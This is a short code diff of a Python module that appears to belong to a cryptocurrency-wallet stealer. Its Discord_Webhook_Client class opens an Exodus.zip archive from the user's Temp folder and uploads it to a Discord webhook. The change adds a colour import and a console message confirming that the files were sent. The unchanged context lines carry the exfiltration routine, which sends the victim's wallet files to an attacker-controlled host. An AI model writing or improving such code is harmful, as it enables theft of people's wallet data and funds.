@@ -1,6 +1,8 @@
 import httpx
 import os.path
 
+from colorama import *
+
 client: str = os.path.expanduser("~")
 
 class Discord_Webhook_Client: 
@@ -16,6 +18,7 @@ class Discord_Webhook_Client:
         try:
             exodus_zip = {"file": open(client + "\\AppData\\Local\\Temp\\Exodus.zip", "rb")}
             request = httpx.post(webhook_url, files=exodus_zip)
+            print(f"{Fore.GREEN}[WEBHOOK SENT]{Fore.RESET} Sent message to webhook containing Files.")
             
             if request.status_code == 200: 
                 return True
